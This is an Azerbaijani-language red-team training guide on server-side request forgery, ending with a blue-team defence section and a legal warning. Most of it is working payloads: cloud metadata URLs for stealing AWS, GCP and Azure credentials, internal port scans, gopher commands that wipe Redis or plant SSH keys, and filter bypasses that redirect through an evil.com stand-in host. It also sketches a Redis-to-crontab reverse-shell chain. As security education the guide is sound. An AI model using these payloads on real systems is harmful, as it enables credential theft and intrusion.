# 🔴 SSRF Hücumları — Red Team Təlim Materialı
**Azərbaycanca | Səviyyə: Başlanğıc → Orta**

---

## 📌 SSRF Nədir?

**SSRF (Server-Side Request Forgery)** — hakerin hədəf serveri özü vasitəsilə **daxili şəbəkəyə və ya xarici resurslara** sorğu göndərməyə məcbur etdiyi hücum növüdür.

Sadə dillə: Bir sayt var, o sayta URL verirsən, sayt həmin URL-ə özü sorğu göndərir. Haker bu mexanizmi istismar edərək serveri **daxili sistemlərə, cloud metadata-ya, yaxud tamamilə başqa serverlərə** sorğu göndərməyə məcbur edir — bu sorğular **serverin özündən** gəldiyi üçün firewall və digər qorumalar çox vaxt keçir.

> 💡 **Əsas məntiq:** Server istifadəçidən gələn URL-i yoxlamadan özü həmin URL-ə müraciət edir. Sən bu URL-i dəyişirsən — server sənin istədiyin yerə sorğu göndərir.

**OWASP Top 10 2021** — SSRF ayrıca kateqoriya kimi daxil edildi. Bu qədər ciddi sayılır çünki cloud mühitlərinin yayılması ilə **kritik infrastruktura giriş** üçün ən effektiv yollardan birinə çevrilib.

---

## 🧠 Necə İşləyir? — Əsas Mexanizm

```
Normal iş axını:
İstifadəçi → Sayta URL verir → Sayt həmin URL-ə GET edir → Cavabı istifadəçiyə göstərir

Məsələn: "Bu şəkli profilimə əlavə et: https://cdn.example.com/photo.jpg"
Sayt: GET https://cdn.example.com/photo.jpg → şəkli çəkir → saxlayır

SSRF hücumu:
İstifadəçi → Sayta ZƏRƏRLİ URL verir → Sayt həmin URL-ə GET edir → Cavabı geri qaytarır

Haker: "Bu URL-i istifadə et: http://169.254.169.254/latest/meta-data/"
Sayt: GET http://169.254.169.254/latest/meta-data/ → AWS metadata alır → hakere göstərir!
```

---

## 🔎 SSRF Harada Tapılır?

SSRF üçün sayt bir yerlərdə URL qəbul etməlidir:

```
□ Şəkil/fayl yükləmə (URL ilə)
  → "Şəkil URL-i daxil edin: [____]"

□ Webhook parametrləri
  → "Bildiriş göndəriləcək URL: [____]"

□ URL preview / link önizləmə
  → Telegram, Slack kimi "link preview" funksiyası

□ PDF / Screenshot generatoru
  → "Bu URL-in PDF-ini yarat: [____]"

□ Import funksiyaları
  → "XML/JSON faylı URL-dən idxal et: [____]"

□ Proxy / translator xidmətləri
  → "Bu saytı tərcümə et: [____]"

□ SSO / OAuth callback URL-ləri
  → redirect_uri parametrləri

□ API inteqrasiyaları
  → "Xarici API endpoint-i: [____]"

□ HTTP header-lər
  → X-Forwarded-For, Host, Referer (bəzi hallarda)
```

---

## 🗂️ SSRF Növləri

---

### 1. 🔴 Basic (In-band) SSRF

**Necə işləyir?**
Server sorğu göndərir və cavabı **birbaşa sənə qaytarır**. Ən sadə və ən aydın növdür — nəticəni dərhal görürsən.

**Nümunə ssenari:**
```
Saytda funksiya var: URL verirsən → sayt o URL-dəki şəkli çəkib saxlayır

Normal istifadə:
POST /fetch_image
url=https://example.com/photo.jpg
→ Sayt şəkli çəkir, saxlayır

SSRF hücumu:
POST /fetch_image
url=http://localhost/admin
→ Sayt localhost-dakı admin paneli çəkir, sənə göstərir!

url=http://192.168.1.1/
→ Daxili router admin paneli!

url=http://169.254.169.254/latest/meta-data/
→ AWS cloud metadata! IAM token-ləri, credentials!
```

**HTTP cavabı birbaşa görünür:**
```
Server cavabı:
{
  "content": "<!DOCTYPE html><html><head><title>Admin Panel</title>..."
}
// Daxili admin panelin HTML-i sənin qarşında!
```

---

### 2. 🟡 Blind SSRF

**Necə işləyir?**
Server sorğu göndərir, amma cavabı **sənə göstərmir**. Sorğunun getdiyini yalnız dolayı əlamətlərdən anlayırsan — vaxt fərqi, xəta mesajları, ya da öz serverinə gələn callback.

**Necə aşkar edilir:**

**Üsul 1 — Burp Collaborator / Interactsh:**
```
Burp Collaborator sənə unikal bir URL verir:
https://abc123.burpcollaborator.net

Bunu sayta göndərirsən:
url=https://abc123.burpcollaborator.net

Sayt bu URL-ə sorğu göndərirsə →
Burp Collaborator panelinde görürsən:
"DNS lookup from 54.23.11.5 (server IP-si)"
"HTTP GET from 54.23.11.5"

Cavabı görməsən də SSRF var olduğunu bilirsən!
```

**Üsul 2 — Vaxt fərqi (Time-based):**
```python
# Daxil olan serverlər cavab vermir, amma vaxt fərqi yaradır
url=http://192.168.1.1/   → Cavab 0.1 saniyə (yoxdur — tez rədd edir)
url=http://192.168.1.100/ → Cavab 30 saniyə (var — timeout gözləyir!)

# Bu fərqdən daxili IP-ləri tapa bilərsən
```

**Üsul 3 — Xəta mesajlarından məlumat:**
```
url=http://internal-db:5432/
→ Xəta: "Connection refused" (Port bağlıdır amma host var!)

url=http://internal-api/secret
→ Xəta: "401 Unauthorized" (Endpoint mövcuddur!)

url=http://notexist.internal/
→ Xəta: "Could not resolve host" (Bu host yoxdur)

Xəta mesajları daxili şəbəkə haqqında məlumat verir!
```

---

### 3. 🟠 Semi-blind SSRF

**Necə işləyir?**
Cavabın bir hissəsi görünür — tam məzmun yox, amma status kodu, header-lər, yaxud xəta mesajı görünür. In-band ilə Blind arasında bir şeydir.

```
url=http://internal-service:8080/admin

Cavab: {"error": "Access denied", "status": 403}
// Cavabı görmürsən amma 403 gəldi → endpoint mövcuddur!

url=http://internal-service:8080/health

Cavab: {"status": "ok", "version": "2.3.1", "db": "connected"}
// Daxili servisin versiyasını öyrəndin!
```

---

## 🎯 SSRF ilə Nə Etmək Olar?

---

### 1. Cloud Metadata Oğurluğu (Ən Kritik!)

Cloud serverlərinin (AWS, GCP, Azure) xüsusi daxili IP ünvanları var — bu ünvanlar serverə aid məlumatları qaytarır:

**AWS (Amazon Web Services):**
```
http://169.254.169.254/latest/meta-data/
→ Instance haqqında məlumat

http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ IAM rol adı

http://169.254.169.254/latest/meta-data/iam/security-credentials/ROL_ADI
→ AccessKeyId, SecretAccessKey, Token — AWS-ə tam giriş!

http://169.254.169.254/latest/user-data/
→ Instance başlayanda işlədilən skript — şifrələr ola bilər!
```

**GCP (Google Cloud):**
```
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
→ OAuth access token — bütün Google Cloud resurslarına giriş!
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/
→ Azure management token!
```

**Real hücum nəticəsi:**
```
1. SSRF ilə AWS credentials al:
   AccessKeyId: AKIA...
   SecretAccessKey: wJalrX...
   Token: AQoXnyc...

2. Öz maşınından AWS CLI ilə istifadə et:
   aws configure  → credentials daxil et
   aws s3 ls      → bütün S3 bucket-ləri gör
   aws ec2 describe-instances → bütün serverləri gör

3. Şirkətin bütün cloud infrastrukturuna girişin var!
```

---

### 2. Daxili Şəbəkə Kəşfi (Internal Network Scanning)

```
# Daxili IP aralığını tara:
url=http://192.168.1.1/   → Router?
url=http://192.168.1.10/  → Server?
url=http://10.0.0.1/      → Daxili gateway?
url=http://172.16.0.1/    → Korporativ şəbəkə?

# Port tarama:
url=http://192.168.1.100:22/    → SSH açıqdırmı?
url=http://192.168.1.100:3306/  → MySQL açıqdırmı?
url=http://192.168.1.100:6379/  → Redis açıqdırmı?
url=http://192.168.1.100:27017/ → MongoDB açıqdırmı?
url=http://192.168.1.100:8080/  → Daxili web app?
url=http://192.168.1.100:9200/  → Elasticsearch?

# Xəta mesajından: timeout vs "connection refused"
# → Hansı portların açıq olduğunu anlayırsan
```

---

### 3. Daxili Servislərə Giriş

```
# Kubernetes metadata:
url=http://kubernetes.default.svc/api/v1/namespaces/default/secrets

# Docker API (qorunmamışsa):
url=http://localhost:2375/v1.24/containers/json
→ Bütün container-ləri gör!
url=http://localhost:2375/v1.24/containers/create
→ Yeni container yarat!

# Consul (service discovery):
url=http://localhost:8500/v1/agent/services
→ Bütün daxili servislərin siyahısı

# Elasticsearch (autentifikasiyasız):
url=http://localhost:9200/_cat/indices
→ Bütün verilənlər bazası index-ləri

url=http://localhost:9200/users/_search
→ İstifadəçi məlumatları!

# Redis (autentifikasiyasız):
url=http://localhost:6379/
→ Gopher protokolu ilə komanda göndər (aşağıda)
```

---

### 4. localhost / 127.0.0.1 Giriş

```
# Xarici tərəfdən əlçatmaz olan admin panel:
url=http://localhost/admin
url=http://127.0.0.1:8080/admin
url=http://0.0.0.0/admin

# localhost-a yalnız serverdən giriş mümkündür
# SSRF vasitəsilə serveri "özünə" sorğu göndərməyə məcbur edirsən
```

---

### 5. Gopher Protokolu ilə Ətraflı Hücumlar

Gopher protokolu raw TCP məlumatı göndərməyə imkan verir — bu isə HTTP olmayan protokollarla da danışmaq deməkdir:

**Redis-ə gopher ilə komanda:**
```
url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
→ Redis-dəki bütün məlumatı sil!

# SSH açarı əlavə et (server ələ keçirmə):
gopher://127.0.0.1:6379/_SET%20ssh_key%20"ssh-rsa%20AAAA..."
```

**MySQL-ə gopher:**
```
gopher://127.0.0.1:3306/_[MySQL auth paketi]
→ Autentifikasiyasız MySQL sorğusu!
```

**SMTP-yə gopher (email göndər):**
```
gopher://127.0.0.1:25/_EHLO%20localhost
→ Daxili mail serverindən email göndər!
```

---

## 🔓 SSRF Bypass Texnikaları

Saytlar `localhost` və `127.0.0.1`-i bloklaya bilər. Bunu keçmək üçün:

### IP Representasiya Bypass-ları
```
# Localhost-un müxtəlif yazılış formaları:
http://127.0.0.1/         ← Bloklandı?
http://localhost/          ← Bloklandı?
http://0/                  ← 0.0.0.0 → localhost!
http://0.0.0.0/            ← Localhost!
http://[::]/               ← IPv6 localhost!
http://[::1]/              ← IPv6 localhost!
http://127.1/              ← 127.0.0.1 qısaldılmış!
http://127.0.1/            ← Bəzi sistemlərdə işləyir
http://2130706433/         ← 127.0.0.1-in decimal forması!
http://0177.0.0.1/         ← Octal forması!
http://0x7f000001/         ← Hex forması!
http://127.000.000.001/    ← Sıfır ilə doldurulan
```

### DNS Rebinding
```
# Öz domenini elə konfiqurasiya et ki:
# İlk DNS sorğu: public IP qaytarsın (filter keçir)
# İkinci DNS sorğu: 127.0.0.1 qaytarsın (SSRF işləyir!)

# Alət: rebinder.net, singularity.safarika.org
```

### URL Redirect
```
# Öz serverindən redirect et:
# evil.com/redirect → 302 → http://169.254.169.254/

url=https://evil.com/redirect
→ Sayt evil.com-a gedib redirect alır → 169.254.169.254-ə gedir!

# PHP ilə sadə redirect:
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
```

### Subdomain Bypass
```
# DNS-i öz serverinə işarə edən subdomain istifadə et:
http://169.254.169.254.evil.com/
# Əgər sayt sadəcə string yoxlayırsa "169.254.169.254" → keçir!
# Amma DNS 169.254.169.254 qaytarırsa → metadata!

# nip.io, xip.io xidmətləri:
http://127.0.0.1.nip.io/
→ 127.0.0.1-ə resolve olunur!
```

### URL Encoding Bypass
```
http://127.0.0.1/%61dmin    ← /admin URL encoded
http://127.0.0.1/..%2fadmin ← Path traversal
http://127.0.0.1/%0a/admin  ← Newline injection

# Double encoding:
http://127.0.0.1/%2561dmin  ← %25 = %, sonra %61 = a
```

### Alternatif Protokollar
```
file:///etc/passwd          ← Lokal fayl oxu!
file:///etc/shadow          ← Şifrə hash-ları!
file:///proc/self/environ   ← Environment variables (secret-lər!)
file:///app/config.py       ← Tətbiq konfiqurasiyası!

dict://127.0.0.1:11211/stat ← Memcached məlumatı
sftp://evil.com:1234/       ← SFTP server credentials
ldap://evil.com/            ← LDAP sorğusu
```

---

## 🔍 SSRF Test Metodologiyası

### Mərhələ 1: Giriş Nöqtələrini Tap
```
Burp Suite ilə bütün trafiki izlə:
□ URL parametrləri: ?url=, ?src=, ?href=, ?path=, ?dest=, ?redirect=
□ POST body: url=, webhook=, endpoint=, api=, callback=
□ JSON: {"url": "...", "target": "...", "host": "..."}
□ XML: <url>...</url>, <href>...</href>
□ Header-lər: X-Forwarded-For, Referer, Host
□ File path: /fetch?resource=, /proxy?target=
```

### Mərhələ 2: Out-of-band Test (Blind SSRF üçün)
```
1. Burp Suite → Burp Collaborator → "Copy to clipboard"
   URL: https://xyz123.burpcollaborator.net

2. Bu URL-i hər şübhəli parametrə yaz
3. Collaborator panelini yoxla → DNS/HTTP sorğu gəldi?
4. Gəldisə → SSRF var!

Alternativ: interactsh (açıq mənbə)
   pip install interactsh-client
   interactsh-client
   → Sənə URL verir, sorğuları izləyirsən
```

### Mərhələ 3: Daxili IP-ləri Tara
```python
# Python ilə avtomatik IP tarama siyahısı:
daxili_iplar = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/",      # AWS metadata
    "http://metadata.google.internal/",  # GCP
    "http://10.0.0.1/",
    "http://192.168.0.1/",
    "http://172.16.0.1/",
]

# Ffuf ilə avtomatlaşdır:
ffuf -w internal_ips.txt -u https://target.com/fetch?url=FUZZ
```

### Mərhələ 4: Port Tarama
```bash
# Ffuf ilə port tarama:
# ports.txt: 21,22,23,25,80,443,3306,5432,6379,8080,8443,9200,27017...
ffuf -w ports.txt -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ/"

# Cavab ölçüsü / vaxt fərqinə görə açıq portları tap
```

### Mərhələ 5: Proof of Concept
```
Bug bounty üçün kritik PoC:
1. AWS metadata → IAM credentials göstər
2. Daxili admin panel-ə giriş göstər
3. File read: file:///etc/passwd məzmununu göstər

Bu üçü ən yüksək bounty qazandırır!
```

---

## 🛠️ SSRF Alətləri

| Alət | İstifadə |
|------|----------|
| **Burp Suite** | Manual test, Collaborator, Intruder |
| **Interactsh** | Out-of-band callback (açıq mənbə) |
| **SSRFmap** | Avtomatik SSRF istismar |
| **Gopherus** | Gopher payload generator |
| **Ffuf** | Fuzzing, port/IP tarama |
| **Nuclei** | SSRF template-ləri ilə avtomatik tarama |

---

## ⚔️ Real Dünya Nümunələri

### Capital One (2019) — $80M Cərimə
```
- AWS-də çalışan Capital One serverində SSRF tapıldı
- Haker SSRF ilə AWS metadata endpoint-inə sorğu göndərdi
- IAM rol credentials-ı əldə etdi
- 100 milyondan çox müştərinin məlumatına çıxış əldə etdi
- Tarixi ən böyük bank data breach-lərindən biri
```

### GitLab (Bug Bounty, $20,000+)
```
- Import funksiyasında SSRF tapıldı
- Haker daxili Kubernetes API-yə giriş əldə etdi
- Bütün GitLab.com infrastrukturuna giriş potensialı vardı
```

### SSRF ilə RCE (Remote Code Execution)
```
Nadir amma mümkündür:
1. SSRF ilə daxili Redis-ə giriş
2. Redis-ə gopher ilə: crontab yazma
3. Crontab reverse shell əmri işlədir
4. Server tamamilə ələ keçirilir!

SSRF → Redis → RCE zənciri real hücumlarda istifadə edilib
```

---

## 🛡️ Müdafiə Tədbirləri (Blue Team)

### 1. Input Validation (Ağ Siyahı)
```python
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.example.com']

def validate_url(url):
    parsed = urlparse(url)

    # Yalnız https icazə ver
    if parsed.scheme not in ['https']:
        raise ValueError("Yalnız HTTPS!")

    # Domain ağ siyahısında olmalıdır
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domain icazəsizdir!")

    # IP ünvanı birbaşa qəbul etmə
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("Daxili IP qadağandır!")
    except ValueError:
        pass  # Domain adıdır, davam et

    return url
```

### 2. Şəbəkə Səviyyəsində Blok
```
# Server daxili IP-lərə sorğu göndərə bilməməlidir:
# Firewall qaydaları:
DENY server → 169.254.0.0/16   (AWS metadata)
DENY server → 10.0.0.0/8       (Daxili şəbəkə)
DENY server → 172.16.0.0/12    (Daxili şəbəkə)
DENY server → 192.168.0.0/16   (Daxili şəbəkə)
DENY server → 127.0.0.0/8      (Localhost)
```

### 3. DNS Rebinding Qoruması
```
# Cavab gəldikdə IP-ni yenidən yoxla:
# İlk resolve: 1.2.3.4 (public) → Keçdi
# Sorğu göndərilmədən: yenidən resolve et
# Yenidən resolve: 127.0.0.1 → BLOKLA!
```

### 4. Metadata Endpoint Qoruması (AWS IMDSv2)
```bash
# AWS IMDSv2 aktiv et — token tələb edir:
# Artıq sadə GET ilə metadata almaq olmaz
# Əvvəlcə PUT sorğusu ilə token al, sonra istifadə et

# SSRF-dən gələn sadə GET sorğusu artıq işləmir!
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx \
  --http-tokens required
```

---

## 📊 SSRF vs Digər Hücumlarla Müqayisə

| | SSRF | CSRF | XXE |
|---|---|---|---|
| **Kim sorğu göndərir?** | Server | Brauzer | Server (XML parser) |
| **Nə hədəf alınır?** | Daxili şəbəkə | İstifadəçi sessiyası | Lokal fayl/şəbəkə |
| **Qurban lazımdır?** | Xeyr | Bəli | Xeyr |
| **Cloud təhlükəsi** | 🔴 Kritik | 🟡 Orta | 🟠 Yüksək |

---

## 🏁 Öyrənmə Yolu

```
1️⃣  PortSwigger Web Security Academy
    → SSRF mövzusu: portswigger.net/web-security/ssrf
    → 12+ praktik lab (blind, filter bypass, cloud metadata)

2️⃣  HackTheBox / TryHackMe
    → "SSRF" ilə axtarış et

3️⃣  PayloadsAllTheThings — SSRF bölməsi
    → github.com/swisskyrepo/PayloadsAllTheThings

4️⃣  Bug Bounty Reportları Oxu
    → hackerone.com/hacktivity → "ssrf" filtr
    → Real hücum metodlarını gör

5️⃣  AWS/GCP/Azure metadata endpoint-lərini öyrən
    → Cloud infrastruktur bilikləri SSRF-i daha effektiv edir
```

---

## ⚠️ Qanuni Xəbərdarlıq

Bu materialda öyrəndiklərini **yalnız**:
- Öz qurduğun test mühitlərində
- İcazə verilmiş bug bounty proqramlarında
- İmzalanmış pentest müqaviləsi olan sistemlərdə

tətbiq et. İcazəsiz sistemlərə hücum **cinayət məsuliyyəti** daşıyır.

---

*📝 Hazırlandı: Red Team Təlim Materialı | SSRF — Orta Səviyyə | v1.0*
